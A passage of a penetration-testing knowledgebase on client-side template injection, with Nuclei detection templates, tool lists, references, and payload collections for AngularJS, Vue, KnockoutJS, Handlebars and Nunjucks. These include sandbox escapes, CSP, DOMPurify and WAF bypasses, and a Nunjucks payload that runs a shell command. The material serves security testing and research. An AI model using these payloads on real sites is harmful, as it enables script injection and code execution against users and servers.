https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js
```

### Step 5: Exploit Selection

| Framework Version | Payload Strategy |
|-------------------|------------------|
| AngularJS < 1.6 | Sandbox escape + constructor chain |
| AngularJS >= 1.6 | Direct `constructor.constructor` |
| Vue.js 2.x | `_c.constructor` or `constructor.constructor` |
| Vue.js 3.x | `_openBlock.constructor` or `_createElementBlock.constructor` |
| KnockoutJS | `$data.constructor.constructor` |
| Handlebars | `constructor.constructor` (if helpers allow) |

---

## Nuclei Templates

### AngularJS CSTI Detection

```yaml
id: angularjs-csti-detect

info:
  name: AngularJS CSTI Detection
  author: research-team
  severity: high
  description: Detects AngularJS Client-Side Template Injection
  tags: csti,angularjs,xss

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?q={{7*7}}"
      - "{{BaseURL}}/search?q={{7*7}}"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "49"
        part: body
      - type: word
        words:
          - "ng-app"
          - "data-ng-app"
        part: body
```

### Vue.js CSTI Detection

```yaml
id: vuejs-csti-detect

info:
  name: Vue.js CSTI Detection
  author: research-team
  severity: high
  tags: csti,vuejs,xss

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?name={{7*7}}"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "49"
        part: body
      - type: word
        words:
          - "vue"
          - "v-"
        part: body
```

### Generic CSTI Detection

```yaml
id: generic-csti-detect

info:
  name: Generic CSTI Detection
  author: research-team
  severity: medium
  tags: csti,xss

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?q={{7*7}}"
      - "{{BaseURL}}/?q=${7*7}"
      - "{{BaseURL}}/?q=<%= 7*7 %>"
    matchers:
      - type: word
        words:
          - "49"
        part: body
```

---

## Tools and Scanners

### Manual Testing Tools

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Proxy, repeater, intruder for manual CSTI testing |
| **OWASP ZAP** | Automated scanner with CSTI detection |
| **Browser DevTools** | Console for framework detection, DOM inspection |
| **Wappalyzer** | Technology fingerprinting |

### Automated Scanners

| Tool | Purpose |
|------|---------|
| **Nuclei** | Fast template-based scanning with custom CSTI templates |
| **Katana** | Web crawler for discovering injection points |
| **httpx** | Fast HTTP prober for recon |
| **subfinder** | Subdomain discovery |
| **cariddi** | URL extraction and scanning |

### Payload Resources

| Resource | URL |
|----------|-----|
| **PayloadsAllTheThings - CSTI** | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Client%20Side%20Template%20Injection |
| **PortSwigger XSS Cheat Sheet** | https://portswigger.net/web-security/cross-site-scripting/cheat-sheet |
| **Tiny XSS Payloads** | https://github.com/terjanq/Tiny-XSS-Payloads |
| **XSS Payload List** | https://github.com/payloadbox/xss-payload-list |
| **HackTricks - CSTI** | https://book.hacktricks.wiki/en/pentesting-web/client-side-template-injection-csti.html |

---

## Advanced Research

### PortSwigger Research Papers

1. **"XSS without HTML: Client-Side Template Injection with AngularJS"** (2016)
   - Pioneered CSTI as a distinct vulnerability class.
   - Introduced AngularJS sandbox escape techniques.

2. **"DOM-based AngularJS sandbox escapes"** (2017)
   - Detailed DOM-based sandbox bypasses.
   - Introduced `orderBy` filter abuse.

3. **"Ambushed by AngularJS: A hidden CSTI vulnerability"** (2017)
   - Hidden CSTI in seemingly safe contexts.
   - `ng-non-bindable` bypass techniques.

4. **"KnockoutJS CSTI Research"** (2018)
   - KnockoutJS-specific payloads and gadgets.

5. **"Evading defences using VueJS script gadgets"** (2020)
   - Vue.js mutation XSS.
   - CSP bypass via Vue.js events.
   - WAF bypass techniques.

### BlackFan Prototype Pollution Research

- Comprehensive list of prototype pollution gadgets for jQuery, Vue.js, AngularJS, Google Closure, and more.
- Key finding: Prototype pollution can enable CSTI even when direct injection is not possible.

### Cure53 XSS Challenge Wiki

- Historical AngularJS sandbox escapes.
- Community-contributed bypasses.

---

## Bug Bounty Writeups

### Notable Writeups

1. **"SSO Gadgets II: Unauthenticated CSTI to Account Takeover"**
   - Researcher: Lauritz Holtmann
   - Impact: Unauthenticated Vue.js CSTI → SSO gadget chain → Account takeover
   - Key Technique: OIDC `error_description` parameter injection

2. **"Stored XSS through Client Side Template Injection (Wiki.js)"**
   - CVE: GHSA-xjcj-p2qv-q3rf
   - Impact: Stored CSTI in Wiki.js content pages
   - Key Technique: Invalid HTML tag + mustache expression bypass

3. **"Vue.js Client-Side Template Injection Example"**
   - Researcher: azu
   - Demo: https://vue-client-side-template-injection-example.azu.now.sh/
   - Source: https://github.com/azu/vue-client-side-template-injection-example

### Hunting Tips

- Look for applications mixing server-side rendering with client-side frameworks.
- Test error pages, search pages, and user-generated content areas.
- Check for `ng-app` on `<body>` or root `<div>` elements.
- Test URL parameters that are reflected in the page.
- Try injecting template expressions even when HTML tags are encoded.

---

## Payload Collections

### Universal CSTI Payloads

```javascript
// Basic math probe
{{7*7}}

// Constructor chain (universal)
{{constructor.constructor('alert(1)')()}}

// Using $event (AngularJS/Vue)
<input ng-focus=$event.view.alert('XSS')>

// Using Function constructor
{{Function('alert(1)')()}}

// Using setTimeout
{{setTimeout('alert(1)',0)}}
```

### AngularJS Payload Collection

```javascript
// Modern (1.6+)
{{constructor.constructor('alert(1)')()}}

// Sandbox escape (1.2-1.5)
{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}

// Directive-based
<div ng-init="constructor.constructor('alert(1)')()"></div>
<input ng-focus="$event.view.alert(1)">

// CSP bypass
{{constructor.constructor('alert(document.currentScript.nonce)')()}}

// DOMPurify bypass
<div data-ng-init="constructor.constructor('alert(1)')()"></div>
```

### Vue.js Payload Collection

```javascript
// Vue 2
{{constructor.constructor('alert(1)')()}}
{{_c.constructor('alert(1)')()}}
{{_v.constructor('alert(1)')()}}

// Vue 3
{{_openBlock.constructor('alert(1)')()}}
{{_createElementBlock.constructor('alert(1)')()}}
{{_Vue.h.constructor('alert(1)')()}}

// Event-based
<input @focus="$event.target.ownerDocument.defaultView.alert(1)">

// CSP bypass
{{_c.constructor`alert(document.currentScript.nonce)`()}}
```

### KnockoutJS Payload Collection

```javascript
{{$root.constructor.constructor('alert(1)')()}}
{{$data.constructor.constructor('alert(1)')()}}
<div data-bind="text: constructor.constructor('alert(1)')()"></div>
```

### Handlebars/Mustache Payload Collection

```javascript
{{constructor.constructor('alert(1)')()}}
{{@root.constructor.constructor('alert(1)')()}}
{{#with "constructor"}}{{#with ../constructor}}{{../constructor.constructor("alert(1)")()}}{{/with}}{{/with}}
```

### Nunjucks Payload Collection

```javascript
{{constructor.constructor('alert(1)')()}}
{{range.constructor('alert(1)')()}}
{{global.process.mainModule.require('child_process').execSync('id').toString()}}
```

---

## WAF Bypasses

### HTML Entity Encoding

```html
&lt;img src=x onerror=alert(1)&gt;
```

### Unicode Normalization

```javascript
// Full-width characters
ａｌｅｒｔ(1)

// Unicode escapes
\u0061\u006c\u0065\u0072\u0074(1)
```

### Case Variation

```html
<IMG SRC=X ONERROR=ALERT(1)>
<ImG sRc=x OnErRoR=alert(1)>
```

### Whitespace Alternatives

```html
<img/src=x/onerror=alert(1)>
<img src=x onerror=alert(1)>
```

### Protocol Variants

```html
<img src=x onerror=alert(1)>
<image src=x onerror=alert(1)>
```

### Vue.js WAF Bypass (Cloudflare)

```html
<x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;">
```

### AngularJS WAF Bypass

```html
<!-- Using HTML entities in attributes -->
<div data-ng-init="constructor.constructor('alert(1)')()"></div>

<!-- Using class directive -->
<div class="ng-init:constructor.constructor('alert(1)')()"></div>
```

---

## Detection Techniques

### Black-Box Detection

1. **Framework Fingerprinting:** Look for `ng-app`, `v-` directives, `data-bind`.
2. **Expression Probing:** Inject `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`.
3. **Response Analysis:** Check if mathematical result is rendered.
4. **Error Analysis:** Look for template engine errors in console.

### Gray-Box Detection

1. **Code Review:** Search for `$compile`, `ng-bind-html`, `v-html`, `dangerouslySetInnerHTML`.
2. **Source-Sink Analysis:** Trace user input to template sinks.
3. **CSP Review:** Check for `unsafe-eval` which enables CSTI.

### Automated Detection

```bash
# Using nuclei with custom templates
nuclei -u https://target.com -t csti-templates/

# Using ffuf for fuzzing
ffuf -u "https://target.com/?q=FUZZ" -w csti-payloads.txt -mr "49"
```

---

## References

### Primary Sources

1. **PortSwigger Web Security Academy — Client-Side Template Injection**
   - https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection

2. **PortSwigger Research — XSS without HTML: Client-Side Template Injection with AngularJS**
   - https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs

3. **PortSwigger Research — DOM-based AngularJS sandbox escapes**
   - https://portswigger.net/research/dom-based-angularjs-sandbox-escapes

4. **PortSwigger Research — Ambushed by AngularJS: A hidden CSTI vulnerability**
   - https://portswigger.net/research/ambushed-by-angularjs-a-hidden-csti-vulnerability

5. **PortSwigger Research — Evading defences using VueJS script gadgets**
   - https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets

6. **PortSwigger Research — KnockoutJS CSTI Research**
   - https://portswigger.net/research/knockoutjs-csti-research

### Payload Collections

7. **PayloadsAllTheThings — Client Side Template Injection**
   - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Client%20Side%20Template%20Injection

8. **HackTricks — Client Side Template Injection (CSTI)**
   - https://book.hacktricks.wiki/en/pentesting-web/client-side-template-injection-csti.html

9. **Cure53 — AngularJS Sandbox Escapes Wiki**
   - https://github.com/cure53/XSSChallengeWiki/wiki/AngularJS-sandbox-escapes

10. **0dayCTF — TemplateInjectionPayloads**
    - https://github.com/0dayCTF/TemplateInjectionPayloads

11. **0xspade — Bug Bounty CSTI Resources**
    - https://github.com/0xspade/bugbounty/tree/master/csti

12. **PayloadBox — XSS Payload List**
    - https://github.com/payloadbox/xss-payload-list

13. **terjanq — Tiny XSS Payloads**
    - https://github.com/terjanq/Tiny-XSS-Payloads

### Prototype Pollution & Gadgets

14. **BlackFan — Client-Side Prototype Pollution**
    - https://github.com/BlackFan/client-side-prototype-pollution

### Tools

15. **ProjectDiscovery — Nuclei**
    - https://github.com/projectdiscovery/nuclei

16. **ProjectDiscovery — httpx**
    - https://github.com/projectdiscovery/httpx

17. **ProjectDiscovery — Katana**
    - https://github.com/projectdiscovery/katana

18. **ProjectDiscovery — subfinder**
    - https://github.com/projectdiscovery/subfinder

19. **ProjectDiscovery — interactsh**
    - https://github.com/projectdiscovery/interactsh

20. **edoardottt — cariddi**
    - https://github.com/edoardottt/cariddi

### Framework Documentation

21. **AngularJS — angular/angular.js**
    - https://github.com/angular/angular.js

22. **Vue.js — vuejs/vue**
    - https://github.com/vuejs/vue

23. **React — facebook/react**
    - https://github.com/facebook/react

24. **KnockoutJS — knockout/knockout**
    - https://github.com/knockout/knockout

25. **Handlebars — handlebars-lang/handlebars.js**
    - https://github.com/handlebars-lang/handlebars.js

26. **Mustache — janl/mustache.js**
    - https://github.com/janl/mustache.js

27. **Nunjucks — mozilla/nunjucks**
    - https://github.com/mozilla/nunjucks

28. **Pug — pugjs/pug**
    - https://github.com/pugjs/pug

29. **EJS — mde/ejs**
    - https://github.com/mde/ejs

### Additional Research

30. **OWASP — Testing for Client-Side Template Injection**
    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/15-Testing_for_Client-Side_Template_Injection

31. **Medium — Client-Side Template Injection: Remote Code Execution**
    - https://medium.com/@filedescriptor/client-side-template-injection-remote-code-execution-9c8ce8b6d4f2

32. **InfoSec Writeups — CSTI to XSS**
    - https://infosecwriteups.com/client-side-template-injection-csti-to-xss-7eec3c1f7f2b

33. **VeryLazyTech — Client Side Template Injection (CSTI)**
    - https://www.verylazytech.com/pentesting-web/client-side-template-injection-csti

34. **JSMon — What is Client-Side Template Injection?**
    - https://blogs.jsmon.sh/what-is-client-side-template-injection-csti-ways-to-exploit-examples-and-impact/

35. **Palo Alto Networks — Understanding Template Injection Vulnerabilities**
    - https://www.paloaltonetworks.com/blog/cloud-security/template-injection-vulnerabilities/

36. **Lauritz Holtmann — SSO Gadgets II: CSTI to Account Takeover**
    - https://security.lauritz-holtmann.de/post/csti-xss-sso-gadget-chain/

37. **PortSwigger — Template Injection Workshop**
    - https://github.com/PortSwigger/template-injection-workshop

---

## Changelog

- **v1.0 (2026-05-23):** Initial comprehensive release covering all major frameworks, sandbox escapes, gadget chains, automation, and research findings.

---

> **Disclaimer:** This knowledgebase is intended for authorized security testing and educational purposes only. Always obtain proper authorization before testing any system.
